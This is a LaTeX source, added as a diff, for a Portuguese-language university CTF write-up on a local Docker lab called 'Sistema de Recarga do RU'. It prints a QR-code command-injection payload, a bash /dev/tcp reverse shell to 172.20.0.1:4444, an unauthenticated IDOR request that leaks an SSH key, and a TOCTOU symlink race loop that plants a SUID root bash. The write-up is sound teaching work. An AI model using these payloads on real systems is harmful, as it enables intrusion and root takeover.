@@ -1,0 +1,557 @@
+%==============================================================================
+% Write-Up de CTF - Sistema de Recarga do RU (03-ru)
+% Materia : CIC0087 - Topicos Avancados em Computadores - Turma 04 - 2026/2
+% Depto.  : Departamento de Ciencias da Computacao
+% Baseado na "Metodologia para Construcao de Write-Ups em CTF"
+%
+% Compilacao:  pdflatex main.tex   (rodar 2x para atualizar o Sumario)
+%==============================================================================
+\documentclass[12pt,a4paper]{article}
+
+%------------------------- Codificacao e idioma -------------------------------
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage[brazil]{babel}
+
+%------------------------- Fonte Times New Roman ------------------------------
+\usepackage{newtxtext}   % corpo em Times
+\usepackage{newtxmath}   % matematica em Times
+
+%------------------------- Margens (minimo 2 cm) ------------------------------
+\usepackage[a4paper,margin=2cm,headheight=15pt,includehead,includefoot]{geometry}
+
+%------------------------- Utilitarios ----------------------------------------
+\usepackage{graphicx}
+\graphicspath{{img/}{./img/}}
+\usepackage{xcolor}
+\usepackage{float}
+\usepackage[hidelinks]{hyperref}
+\usepackage{fancyhdr}
+\usepackage{listings}
+\usepackage[most]{tcolorbox}
+\usepackage{caption}
+\usepackage{enumitem}
+\usepackage{setspace}
+
+\hypersetup{
+  colorlinks=true,
+  linkcolor=black,
+  urlcolor=blue!60!black,
+  citecolor=black
+}
+\onehalfspacing
+
+%============================= METADADOS =======================================
+\newcommand{\desafioNome}{Sistema de Recarga do RU}
+\newcommand{\plataforma}{Desafio local --- Docker (\texttt{ru-machine:1.0})}
+\newcommand{\dificuldade}{Médio}
+\newcommand{\dataResolucao}{19/11/2026}
+
+% Dados academicos (fixos para a disciplina)
+\newcommand{\materia}{CIC0087 -- Tópicos Avançados em Computadores -- Turma 04 -- 2026/2}
+\newcommand{\departamento}{Departamento de Ciências da Computação}
+\newcommand{\professor}{Roberto Rodrigues Filho}
+\newcommand{\universidade}{Universidade de Brasília}
+%===============================================================================
+
+%------------------------- Cabecalho e rodape ---------------------------------
+\pagestyle{fancy}
+\fancyhf{}
+\lhead{\small\itshape \desafioNome}
+\rhead{\small\itshape Segurança Ofensiva --- CTF}
+\lfoot{\small \materia}
+\rfoot{\small Página \thepage}
+\renewcommand{\headrulewidth}{0.4pt}
+\renewcommand{\footrulewidth}{0.4pt}
+
+%------------------------- Estilo dos blocos de codigo ------------------------
+\definecolor{codebg}{gray}{0.95}
+\definecolor{codeframe}{gray}{0.75}
+\definecolor{cmt}{RGB}{100,120,100}
+\definecolor{kw}{RGB}{0,0,150}
+\definecolor{str}{RGB}{150,50,50}
+
+\lstdefinestyle{shell}{
+  backgroundcolor=\color{codebg},
+  basicstyle=\ttfamily\small,
+  keywordstyle=\color{kw}\bfseries,
+  commentstyle=\color{cmt}\itshape,
+  stringstyle=\color{str},
+  frame=single,
+  rulecolor=\color{codeframe},
+  breaklines=true,
+  breakatwhitespace=false,
+  postbreak=\mbox{\textcolor{codeframe}{$\hookrightarrow$}\space},
+  columns=fullflexible,
+  keepspaces=true,
+  showstringspaces=false,
+  tabsize=2,
+  captionpos=b,
+  xleftmargin=0.4em,
+  xrightmargin=0.4em,
+  aboveskip=1em,
+  belowskip=1em,
+}
+\lstset{style=shell}
+
+% Atalho: comando de terminal em linha
+\newcommand{\cmd}[1]{\lstinline[style=shell]|#1|}
+
+% Ambiente para OUTPUT (fundo levemente diferente, fonte menor)
+\lstdefinestyle{output}{
+  style=shell,
+  backgroundcolor=\color{gray!8},
+  basicstyle=\ttfamily\footnotesize,
+  keywordstyle=\ttfamily,
+}
+
+%------------ Caixa de "becos sem saida" (tentativas sem sucesso) --------------
+\definecolor{deadendbg}{RGB}{255,248,240}
+\definecolor{deadendframe}{RGB}{193,108,44}
+\newtcolorbox{becosemsaida}[1][Tentativas sem sucesso (becos sem saída)]{%
+  enhanced, breakable,
+  colback=deadendbg, colframe=deadendframe,
+  colbacktitle=deadendframe, coltitle=white,
+  boxrule=0.6pt, arc=2pt,
+  left=8pt, right=8pt, top=6pt, bottom=6pt,
+  fonttitle=\bfseries\small,
+  title={#1}%
+}
+
+%===============================================================================
+\begin{document}
+
+%============================= 2.1 CAPA =========================================
+\begin{titlepage}
+  \thispagestyle{empty}
+  \centering
+  {\scshape \universidade \par}
+  {\scshape \departamento \par}
+  \vspace{0.4cm}
+  {\small \materia \par}
+  \vspace{2.5cm}
+
+  \rule{\linewidth}{0.4pt}\par
+  \vspace{0.6cm}
+  {\huge \bfseries Write-Up: \desafioNome \par}
+  \vspace{0.4cm}
+  {\large Segurança Ofensiva --- Capture The Flag \par}
+  \vspace{0.6cm}
+  \rule{\linewidth}{0.4pt}\par
+
+  \vspace{2.0cm}
+  \begin{tabular}{rl}
+    \textbf{Plataforma:}       & \plataforma       \\[4pt]
+    \textbf{Dificuldade:}      & \dificuldade      \\[4pt]
+    \textbf{Data de resolução:}& \dataResolucao    \\
+  \end{tabular}
+
+  \vfill
+
+  \begin{tabular}{rl}
+    \textbf{Integrantes:} & Giovanna Felipe Guimarães --- 241038998 \\[4pt]
+                          & Luís Eduardo Curi Serra --- 251033574 \\[4pt]
+                          & Tarsila Marques de Oliveira Alves --- 242012029 \\[4pt]
+                          & Nirva Neves de Macedo --- 232009585 \\[8pt]
+    \textbf{Professor:}   & \professor \\
+  \end{tabular}
+
+  \vspace{1.2cm}
+  {\small \today \par}
+\end{titlepage}
+
+%============================= 2.2 SUMARIO ======================================
+\newpage
+\tableofcontents
+\thispagestyle{fancy}
+\newpage
+
+%============================= 2.3 VISAO GERAL ==================================
+\section{Visão Geral}
+\textbf{Sistema de Recarga do RU} é um desafio Linux de dificuldade \emph{média},
+distribuído como container Docker, que expõe apenas \textbf{SSH (2222)} e um
+\textbf{portal web Flask (8000)}. O acesso inicial é inteiramente \textbf{web}: a
+enumeração revela a rota \texttt{/beta}, um módulo de \emph{Recarga de Créditos via
+Carteirinha} que recebe a foto de uma carteirinha estudantil, lê o \textbf{QR
+Code} da imagem e repassa o conteúdo decodificado a um \textbf{script legado}
+executado via \emph{shell} --- sem qualquer saneamento. Isso permite
+\textbf{injeção de comando} (CVE/CWE-78) embutindo um \emph{payload} no próprio
+texto do QR Code, resultando em execução como \texttt{ru\_web} e numa
+\textbf{reverse shell} (flag de usuário). A \textbf{movimentação lateral} explora
+uma API administrativa interna (\texttt{/opt/admin-api}, porta 9090) que roda como
+\texttt{root} \textbf{sem autenticação}: um \textbf{IDOR} no endpoint
+\texttt{/api/v1/operadores/3} vaza a \textbf{chave privada SSH} do usuário
+\texttt{operador\_caixa}, usada para login via SSH (segunda flag). Por fim, o
+serviço de conciliação \texttt{/opt/conciliacao.py}, executado como \texttt{root},
+contém uma condição de corrida \textbf{TOCTOU} combinada a \textbf{symlink}: ele
+checa \texttt{conciliacao.tmp} com \texttt{lstat} (sem seguir links), mas depois
+abre o mesmo caminho com \texttt{open("w")} (seguindo links), permitindo
+sobrescrever e executar o \emph{helper} \texttt{helper\_conciliacao.sh} como root.
+Fluxo: reconhecimento $\rightarrow$ QR Code RCE $\rightarrow$ \texttt{ru\_web}
+$\rightarrow$ IDOR / chave SSH $\rightarrow$ \texttt{operador\_caixa}
+$\rightarrow$ TOCTOU / symlink $\rightarrow$ \texttt{root}.
+
+%============================= 2.4 RECONHECIMENTO ===============================
+\section{Reconhecimento}
+
+\subsection{Varredura de portas}
+\begin{lstlisting}[language=bash,caption={Varredura inicial de portas com Nmap.}]
+nmap -T4 127.0.0.1
+\end{lstlisting}
+
+Apenas \textbf{duas portas} abertas. O Nmap rotula os serviços por porta padrão
+(\texttt{EtherNetIP-1} e \texttt{http-alt}), mas o \texttt{docker-compose.yml} do
+desafio confirma o mapeamento real: \textbf{2222 $\rightarrow$ SSH} (22 do
+container) e \textbf{8000 $\rightarrow$ portal web Flask}.
+
+\begin{lstlisting}[style=output,caption={Portas abertas identificadas.}]
+PORT     STATE SERVICE
+2222/tcp open  EtherNetIP-1
+8000/tcp open  http-alt
+\end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.95\linewidth]{nmap.png}
+  \caption{Varredura Nmap: portas 2222 (SSH) e 8000 (portal web).}
+  \label{fig:nmap}
+\end{figure}
+
+\subsection{Enumeração web}
+A raiz \texttt{http://127.0.0.1:8000/} apresenta apenas a \emph{home}, sem conteúdo
+útil. A enumeração de diretórios com Gobuster revela duas rotas relevantes:
+\texttt{/beta} (200) e \texttt{/upload} (405 --- aceita apenas POST).
+
+\begin{lstlisting}[language=bash,caption={Enumeração de diretórios com Gobuster.}]
+gobuster dir -u http://127.0.0.1:8000 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
+\end{lstlisting}
+
+\begin{lstlisting}[style=output,caption={Rotas encontradas pelo Gobuster.}]
+beta     (Status: 200) [Size: 1768]
+upload   (Status: 405) [Size: 153]
+\end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.95\linewidth]{gobuster.png}
+  \caption{Gobuster: \texttt{/beta} (módulo de recarga) e \texttt{/upload}
+  (endpoint que só responde a POST).}
+  \label{fig:gobuster}
+\end{figure}
+
+A página \texttt{/beta} é um formulário de \emph{Recarga de Créditos via Carteirinha
+[BETA]} e traz um \textbf{DEV\_NOTE} que aponta um arquivo de teste e entrega o
+vetor do desafio:
+
+\begin{lstlisting}[style=output,caption={Comentario de desenvolvimento exposto em /beta.}]
+DEV_NOTE: Validando integracao optica com o script legado.
+Arquivo de teste gerado pela equipe de homologacao: /carterinha-teste.jpg
+\end{lstlisting}
+
+O arquivo \texttt{/carterinha-teste.jpg} é a \emph{carteirinha} de homologação,
+contendo um QR Code que o sistema lê e valida.
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.85\linewidth]{sample_img_qr_code.png}
+  \caption{Carteirinha de teste (\texttt{/carterinha-teste.jpg}): o QR Code à
+  direita é o dado processado pelo \emph{script legado}.}
+  \label{fig:carteirinha}
+\end{figure}
+
+\begin{becosemsaida}
+\begin{itemize}[leftmargin=1.4em,itemsep=2pt,topsep=2pt]
+  \item A raiz do portal não expõe nada além da \emph{home}; só a enumeração com
+        Gobuster revela \texttt{/beta} e \texttt{/upload}. O menção ``integração
+        óptica com o script legado'' no DEV\_NOTE é a dica de que o conteúdo do QR
+        é passado a um \emph{shell}.
+\end{itemize}
+\end{becosemsaida}
+
+%============================= 2.5 EXPLORACAO ===================================
+\section{Exploração}
+
+\subsection{Análise do fluxo de upload}
+O formulário de \texttt{/beta} envia a imagem (campo \texttt{carteirinha}) via
+\textbf{POST} para \texttt{/upload}. O servidor Flask tenta decodificar um
+\textbf{QR Code} presente na imagem; se não houver QR legível, devolve a mensagem
+\emph{``Não foi possível ler o QR Code da carteirinha.''}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.9\linewidth]{qr_code_invalido.png}
+  \caption{Formulário \texttt{/beta}: sem um QR Code legível, o sistema recusa a
+  imagem.}
+  \label{fig:qr_invalido}
+\end{figure}
+
+Quando o QR é lido com sucesso, a resposta exibe o rótulo \emph{``Saída do sistema
+de catracas / acadêmico''} seguido de \emph{``Matrícula \texttt{<conteúdo>}
+validada com sucesso.''}. Esse rótulo confirma que o texto decodificado do QR é
+repassado a um \textbf{script legado} executado via \emph{shell}.
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.9\linewidth]{file_send.png}
+  \caption{Envio de uma carteirinha com QR Code válido pelo módulo \texttt{/beta}.}
+  \label{fig:file_send}
+\end{figure}
+
+\subsection{Injeção de comando via QR Code (CWE-78)}
+Como o conteúdo do QR é concatenado em uma linha de comando sem saneamento,
+embute-se um \emph{payload} que encadeia um segundo comando com \texttt{;}. Gera-se
+um QR Code (biblioteca \texttt{qrcode} do Python) contendo:
+
+\begin{lstlisting}[language=bash,caption={Payload de prova de conceito embutido no QR Code.}]
+123456789; id
+\end{lstlisting}
+
+\begin{lstlisting}[language=python,caption={Geração da imagem com o QR Code malicioso.}]
+import qrcode
+payload = '123456789; id'
+img = qrcode.make(payload)
+img = img.convert('RGB')
+img.save('test_inj.jpg')
+\end{lstlisting}
+
+Ao enviar essa imagem em \texttt{/upload}, a resposta executa o \texttt{id} e
+retorna a identidade do processo do servidor --- \textbf{injeção de comando
+confirmada}, executando como \texttt{ru\_web}:
+
+\begin{lstlisting}[style=output,caption={Saida do servidor: id executado via injecao no QR.}]
+Matricula 123456789 validada com sucesso.
+uid=1000(ru_web) gid=1000(ru_web) groups=1000(ru_web)
+\end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.9\linewidth]{qr_code_valido_com_remote_command_execution.png}
+  \caption{\emph{Command injection} confirmada: o QR com \texttt{; id} faz o
+  servidor retornar \texttt{uid=1000(ru\_web)}.}
+  \label{fig:rce}
+\end{figure}
+
+\subsection{Reverse shell como ru\_web}
+Com execução arbitrária garantida, troca-se o \texttt{id} por uma \textbf{reverse
+shell}. O destino é \texttt{172.20.0.1} --- o \emph{gateway} da rede Docker, isto
+é, o endereço pelo qual o container alcança o \emph{host}. Usar \texttt{127.0.0.1}
+falharia, pois de dentro do container apontaria para o próprio container.
+
+\begin{lstlisting}[language=bash,caption={Payload de reverse shell embutido no QR Code.}]
+123456789; bash -c "bash -i >& /dev/tcp/172.20.0.1/4444 0>&1"
+\end{lstlisting}
+
+\begin{lstlisting}[language=bash,caption={Listener na maquina atacante e envio do QR.}]
+# Na maquina atacante:
+nc -lvnp 4444
+# Em seguida, envia-se a imagem com o QR acima em /beta -> /upload
+\end{lstlisting}
+
+A conexão retorna uma \emph{shell} interativa como \texttt{ru\_web}, e a
+\textbf{flag de usuário} está em \texttt{/home/ru\_web}.
+
+\begin{lstlisting}[language=bash,caption={Shell como ru_web e leitura da flag de usuario.}]
+cat /home/ru_web/user_ru_web.txt
+\end{lstlisting}
+
+\begin{lstlisting}[style=output,caption={Flag de usuario (ru_web).}]
+TAC{RU_qr_c0de_nao_e_so_pra_leitura_7f3a1c}
+\end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.95\linewidth]{user_flag.png}
+  \caption{\emph{Reverse shell} como \texttt{ru\_web} (gateway \texttt{172.20.0.1})
+  e leitura da \emph{flag} de usuário.}
+  \label{fig:user_flag}
+\end{figure}
+
+\begin{becosemsaida}
+\begin{itemize}[leftmargin=1.4em,itemsep=2pt,topsep=2pt]
+  \item A primeira tentativa de \emph{reverse shell} apontando para
+        \texttt{127.0.0.1} não conecta: dentro do container esse endereço é o
+        próprio container. É preciso usar o \emph{gateway} da rede Docker
+        (\texttt{172.20.0.1}) para alcançar o \emph{host} atacante.
+\end{itemize}
+\end{becosemsaida}
+
+%============================= 2.6 MOV. LATERAL =================================
+\section{Movimentação Lateral (ru\_web $\rightarrow$ operador\_caixa)}
+
+\subsection{Enumeração de serviços internos}
+Listando os processos com \cmd{ps aux}, identificam-se três serviços
+\textbf{executados como \texttt{root}} que não aparecem externamente: uma API
+administrativa, um painel e um \emph{job} de conciliação.
+
+\begin{lstlisting}[style=output,caption={Processos root relevantes (ps aux).}]
+root  19  python3 /opt/admin-api/app.py
+root  20  python3 /opt/painel/app.py
+root  21  python3 -u /opt/conciliacao.py
+\end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.95\linewidth]{root_python_scripts.png}
+  \caption{\texttt{ps aux} e enumeração de \texttt{/opt}: \texttt{admin-api},
+  \texttt{painel}, \texttt{conciliacao.py} e \texttt{helper\_conciliacao.sh}
+  (todos de \texttt{root}).}
+  \label{fig:opt}
+\end{figure}
+
+\subsection{IDOR na admin-api e vazamento de chave SSH}
+A leitura de \texttt{/opt/admin-api/app.py} mostra que a API (porta \textbf{9090})
+roda \textbf{sem autenticação}. O endpoint \texttt{/api/v1/operadores/<id>} aceita
+um identificador numérico e devolve os dados do operador --- inclusive sua
+\textbf{chave privada SSH}. Trata-se de um \textbf{IDOR} (CWE-639): basta iterar o
+\texttt{id} para acessar qualquer operador.
+
+\begin{lstlisting}[language=bash,caption={Requisicao ao endpoint interno sem autenticacao.}]
+curl -s http://127.0.0.1:9090/api/v1/operadores/3
+\end{lstlisting}
+
+\begin{lstlisting}[style=output,caption={Resposta do IDOR: chave privada de operador_caixa (truncada).}]
+{"cargo":"Operador de Caixa (automacao)",
+ "chave_privada":"-----BEGIN OPENSSH PRIVATE KEY-----\n...TRUNCADA...\n-----END OPENSSH PRIVATE KEY-----\n",
+ "email":"operador_caixa@ru.unb.br","id":3,
+ "nome":"Sistema Operador de Caixa","usuario":"operador_caixa"}
+\end{lstlisting}
+
+Grava-se a chave localmente (ajustando as quebras de linha), restringem-se as
+permissões e autentica-se via SSH na porta 2222.
+
+\begin{lstlisting}[language=bash,caption={Uso da chave vazada para login SSH como operador_caixa.}]
+chmod 600 id_operador
+ssh -i id_operador -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+    -p 2222 operador_caixa@127.0.0.1
+\end{lstlisting}
+
+A \textbf{flag de operador} está no \emph{home} de \texttt{operador\_caixa}.
+
+\begin{lstlisting}[language=bash,caption={Flag de operador.}]
+cat user_operador.txt
+\end{lstlisting}
+
+\begin{lstlisting}[style=output,caption={Flag de movimentacao lateral (operador_caixa).}]
+TAC{RU_1d0r_ssh_operador_6b2f9a}
+\end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.95\linewidth]{operador_flag.png}
+  \caption{Chave vazada pelo IDOR, login SSH como \texttt{operador\_caixa} e
+  leitura da \emph{flag} de operador.}
+  \label{fig:operador_flag}
+\end{figure}
+
+\begin{becosemsaida}
+\begin{itemize}[leftmargin=1.4em,itemsep=2pt,topsep=2pt]
+  \item A chave retornada pela API vem com as quebras de linha escapadas
+        (\texttt{\textbackslash n}). Foi preciso reconstruir o arquivo PEM com as
+        quebras reais, caso contrário o SSH recusa a chave
+        (\emph{error in libcrypto} / \emph{Permission denied}).
+\end{itemize}
+\end{becosemsaida}
+
+%======================== 2.7 ESCALADA DE PRIVILEGIOS ==========================
+\section{Escalada de Privilégios (operador\_caixa $\rightarrow$ root)}
+
+\subsection{Análise do job de conciliação}
+O \texttt{/opt/conciliacao.py}, executado como \texttt{root} em laço, processa um
+arquivo \texttt{conciliacao.tmp} no diretório \texttt{/var/ru/caixa} (gravável pelo
+operador). A lógica contém uma condição de corrida \textbf{TOCTOU} (CWE-367)
+agravada por \textbf{symlink}:
+
+\begin{lstlisting}[style=output,caption={Trecho vulneravel de /opt/conciliacao.py.}]
+info = RELATORIO.lstat()          # 1) checa conciliacao.tmp SEM seguir symlink (exige regular)
+if not stat.S_ISREG(...): return  #    -> precisa ser arquivo regular neste instante
+time.sleep(15)                     # 2) janela de 15s entre a checagem e o uso
+with open(RELATORIO, "w") as f:    # 3) open("w") SEGUE symlink e TRUNCA o alvo
+    f.write(dados)                 #    escreve o conteudo de dados.csv (controlado pelo atacante)
+subprocess.run(["/bin/bash", "/opt/helper_conciliacao.sh"])  # 4) executa o helper como root
+\end{lstlisting}
+
+A falha: a \textbf{verificação} (\texttt{lstat}, não segue links) e o \textbf{uso}
+(\texttt{open("w")}, segue links) operam sobre o mesmo caminho, mas em momentos
+diferentes, com 15 s de intervalo. Trocando \texttt{conciliacao.tmp} de
+\emph{arquivo regular} para \emph{symlink} dentro dessa janela, o \texttt{open("w")}
+segue o link e \textbf{sobrescreve} \texttt{/opt/helper\_conciliacao.sh} com o
+conteúdo de \texttt{dados.csv} --- que é então executado como \texttt{root}.
+
+\subsection{Exploração do TOCTOU + symlink}
+Prepara-se o \emph{payload} em \texttt{dados.csv} (copia o \texttt{bash} e marca-o
+com SUID) e roda-se um laço que alterna \texttt{conciliacao.tmp} entre arquivo
+regular (para passar o \texttt{lstat}) e \emph{symlink} para o \emph{helper} (para
+o \texttt{open} truncá-lo).
+
+\begin{lstlisting}[language=bash,caption={Payload que sera escrito no helper e executado como root.}]
+cd /var/ru/caixa
+cat > dados.csv <<'EOF'
+cp /bin/bash /tmp/.rootbash
+chmod 6755 /tmp/.rootbash
+EOF
+\end{lstlisting}
+
+\begin{lstlisting}[language=bash,caption={Laco de corrida: alterna arquivo regular <-> symlink na janela de 15s.}]
+while [ ! -u /tmp/.rootbash ]; do
+  rm -f conciliacao.tmp; printf 'x' > conciliacao.tmp                 # fase regular (passa no lstat)
+  sleep 15
+  rm -f conciliacao.tmp; ln -s /opt/helper_conciliacao.sh conciliacao.tmp  # fase symlink (open segue)
+  sleep 15
+done
+echo "[+] GANHOU - /tmp/.rootbash com SUID"
+\end{lstlisting}
+
+Ao vencer a corrida, surge \texttt{/tmp/.rootbash} com \emph{bit} SUID de
+\texttt{root}. Executando-o com \texttt{-p} (preserva privilégios), obtém-se
+\emph{shell} de \texttt{root} e a \textbf{flag final}.
+
+\begin{lstlisting}[language=bash,caption={Shell root via SUID e leitura da flag de root.}]
+/tmp/.rootbash -p
+cat /root/root.txt
+\end{lstlisting}
+
+\begin{lstlisting}[style=output,caption={Flag de root.}]
+TAC{RU_t0ct0u_syml1nk_r00t_9c4e2b}
+\end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.95\linewidth]{root_flag.png}
+  \caption{Exploração do TOCTOU/symlink: \texttt{/tmp/.rootbash} com SUID,
+  \emph{shell} como \texttt{root} e leitura da \emph{flag} de \texttt{root}.}
+  \label{fig:root_flag}
+\end{figure}
+
+%============================= 2.8 CONCLUSAO ====================================
+\section{Conclusão}
+O comprometimento encadeou quatro falhas distintas. O acesso inicial veio de uma
+\textbf{injeção de comando} (CWE-78): o conteúdo do QR Code da carteirinha era
+repassado a um \emph{script legado} sem saneamento, permitindo execução como
+\texttt{ru\_web} e \emph{reverse shell}. A \textbf{movimentação lateral} explorou
+uma \textbf{API interna sem autenticação} com \textbf{IDOR} (CWE-639), que vazou a
+\textbf{chave privada SSH} de \texttt{operador\_caixa}. A \textbf{escalada a root}
+abusou de uma condição de corrida \textbf{TOCTOU} (CWE-367) combinada a
+\textbf{symlink} no \emph{job} de conciliação executado como \texttt{root},
+sobrescrevendo um \emph{helper} e obtendo um \texttt{bash} com SUID. As falhas
+centrais foram: \textbf{entrada não saneada} enviada ao \emph{shell}, \textbf{falta
+de autenticação e controle de acesso} na API administrativa, \textbf{exposição de
+segredos} (chave privada) e \textbf{uso inseguro de arquivos temporários} (checar
+com \texttt{lstat} e usar com \texttt{open} segue-link, em caminho gravável por
+terceiros).
+
+%============================= 2.9 REFERENCIAS =================================
+\section{Referências}
+\begin{itemize}[leftmargin=1.5em]
+  \item OWASP --- \emph{Command Injection} ---
+        \url{https://owasp.org/www-community/attacks/Command_Injection}
+  \item MITRE --- \emph{CWE-78: OS Command Injection} ---
+        \url{https://cwe.mitre.org/data/definitions/78.html}
+  \item MITRE --- \emph{CWE-639: Authorization Bypass Through User-Controlled Key (IDOR)} ---
+        \url{https://cwe.mitre.org/data/definitions/639.html}
+  \item MITRE --- \emph{CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition} ---
+        \url{https://cwe.mitre.org/data/definitions/367.html}
+  \item HackTricks --- \emph{Linux Privilege Escalation (Race Conditions / Symlinks)} ---
+        \url{https://book.hacktricks.xyz/linux-hardening/privilege-escalation}
+\end{itemize}
+
+\end{document}
